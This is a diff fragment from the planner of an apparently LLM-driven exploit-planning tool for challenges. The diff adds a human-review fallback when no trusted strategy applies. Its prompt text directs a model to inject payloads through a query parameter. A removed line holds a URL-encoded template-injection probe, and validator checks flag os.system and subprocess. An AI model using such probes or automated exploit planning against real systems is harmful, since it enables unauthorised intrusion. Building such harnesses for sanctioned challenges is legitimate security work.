     for err_text in validator_errors:
         err_str = str(err_text)
         # 提取被拒绝的模式名（从 remediation 文本中解析）
-        if "os.system" in err_str or "禁止代码文本出现 os.system(" in err_str:
+        if "OS command API" in err_str or "禁止代码文本出现 OS command API(" in err_str:
             failures.append({"step_id": "?", "error": "validator_rejected_os_system", "root_cause": err_str[:200]})
         elif "subprocess" in err_str:
             failures.append({"step_id": "?", "error": "validator_rejected_subprocess", "root_cause": err_str[:200]})
@@ -2382,23 +1939,39 @@ def run_planner(
     adapter: ChallengeAdapter | None = None,
     trusted_selection: dict[str, Any] | None = None,
 ) -> dict[str, Any]:
+    trusted_status = (trusted_selection or {}).get("status", "")
+    trusted_allowed = (trusted_selection or {}).get("allowed_canonical_strategy_ids") or []
+
+    if trusted_status in ("NO_MATCHED_TEMPLATE", "ALL_MATCHED_STRATEGIES_REJECTED"):
+        plan = {
+            "version": 1,
+            "plan_id": "plan_no_available_strategy",
+            "selected_canonical_strategy_id": "",
+            "trusted_run_id": (trusted_selection or {}).get("run_id"),
+            "trusted_round": (trusted_selection or {}).get("round"),
+            "trusted_selection_hash": (trusted_selection or {}).get("selection_hash"),
+            "vuln_summary": trusted_status,
+            "rationale": "No executable trusted strategy is available for this confirmed surface.",
+            "steps": [],
+            "status": trusted_status,
+            "needs_human_review": True,
+            "platform": platform.system(),
+        }
+        if trusted_status == "NO_MATCHED_TEMPLATE":
+            plan["review_task"] = "Create or migrate a reviewed template with canonical_strategy_id."
+        else:
+            plan["review_task"] = "Generate a new reviewed strategy family; do not revive rejected strategies."
+        out_path.parent.mkdir(parents=True, exist_ok=True)
+        out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
+        return plan
+
     if settings.mock_llm or llm is None:
         plan = _mock_plan(confirmed, memory)
-        try:
-            _mock_selection = _select_cwe_templates(
-                confirmed.get("vulnerabilities", []),
-                confirmed,
-                state=(feedback or {}).get("current_exploit_state", ""),
-            )
-            plan["template_selection"] = _mock_selection.to_dict()
-        except Exception:
-            pass
         if trusted_selection:
-            allowed = trusted_selection.get("allowed_canonical_strategy_ids") or []
             plan["trusted_run_id"] = trusted_selection.get("run_id")
             plan["trusted_round"] = trusted_selection.get("round")
             plan["trusted_selection_hash"] = trusted_selection.get("selection_hash")
-            plan["selected_canonical_strategy_id"] = allowed[0] if allowed else ""
+            plan["selected_canonical_strategy_id"] = trusted_allowed[0] if trusted_allowed else ""
         if feedback:
             plan["prior_feedback"] = feedback
         plan["attempted_strategy"] = build_attempted_strategy(confirmed, plan, source="mock_planner")
@@ -2464,11 +2037,6 @@ def run_planner(
     }
 
     _current_state = (feedback or {}).get("current_exploit_state", "")
-    template_selection = _select_cwe_templates(
-        confirmed.get("vulnerabilities", []),
-        confirmed,
-        state=_current_state,
-    )
     user["trusted_template_selection"] = {
         "run_id": (trusted_selection or {}).get("run_id"),
         "round": (trusted_selection or {}).get("round"),
@@ -2478,9 +2046,22 @@ def run_planner(
         "migration_report": (trusted_selection or {}).get("migration_report") or [],
         "non_executable_templates": (trusted_selection or {}).get("non_executable_templates") or [],
     }
-    if template_selection.status == "ALL_MATCHED_STRATEGIES_REJECTED":
+    # ── Per-strategy safe metadata (no executable payload text) ──
+    _strategy_meta: list[dict[str, str]] = []
+    _health = (trusted_selection or {}).get("strategy_health") or {}
+    for _sid in user["trusted_template_selection"]["allowed_canonical_strategy_ids"]:
+        _sh = _health.get(_sid, {})
+        _strategy_meta.append({
+            "canonical_strategy_id": _sid,
+            "description": str(_sh.get("reason") or _sh.get("dominant_failure_stage") or "available"),
+            "decision": str(_sh.get("decision", "ALLOW")),
+            "budget": str(_sh.get("budget", 1)),
+            "scope": str(_sh.get("scope", "strategy_only")),
+        })
+    user["trusted_template_selection"]["strategy_metadata"] = _strategy_meta
+    if trusted_status == "ALL_MATCHED_STRATEGIES_REJECTED":
         user["template_selection_notice"] = _NO_AVAILABLE_STRATEGY_BLOCK
-    core_logic = _extract_user_goal_dense(confirmed, adapter=adapter, state=_current_state)
+    core_logic = _extract_user_goal_dense(confirmed, adapter=adapter, trusted_selection=trusted_selection)
 
     if core_logic.startswith("【严重配置错误】"):
         print(f"[planner] ⚠️ {core_logic}")
@@ -2518,7 +2099,7 @@ def run_planner(
 
     # ── L2: Hard Constraints (bans + forbidden techniques blacklist) ──
     l2 = _build_hard_constraints_block()
-    if template_selection.status == "ALL_MATCHED_STRATEGIES_REJECTED":
+    if trusted_status == "ALL_MATCHED_STRATEGIES_REJECTED":
         l2 = _NO_AVAILABLE_STRATEGY_BLOCK + "\n\n" + l2
     if feedback:
         forbidden_block = _build_forbidden_techniques_block(feedback)
@@ -2825,7 +2406,6 @@ def run_planner(
 
         plan.setdefault("version", 1)
         plan["platform"] = platform.system()
-        plan["template_selection"] = template_selection.to_dict()
 
         # ── P0: 自动解包 LLM 常见的错误嵌套格式 ──
         # 模型经常把 steps 包在 plan / attack_plan 里，直接解包提升鲁棒性
@@ -2969,7 +2549,7 @@ def _build_user_goal_block_fn(vuln: dict, goal_text: str) -> str:
         f"[关键注入点 — 必须使用]\n"
         f"端点: GET /?{param_name}=<PAYLOAD>\n"
         f"模板占位符: {placeholder} 被参数值替换后送入模板引擎执行\n"
-        f"探测: GET /?{param_name}=%23set(%24x%3D7*7)%24%7Bx%7D → 响应含49即确认注入\n"
+        f"探测: GET /?{param_name}=%23set(%24x%3DARITHMETIC_PROBE)%24%7Bx%7D → 响应含49即确认注入\n"
         f"禁止裸访问 GET / — 每个step必须携带 ?{param_name}= 参数\n"
         f"--- 任务目标 ---\n"
     )
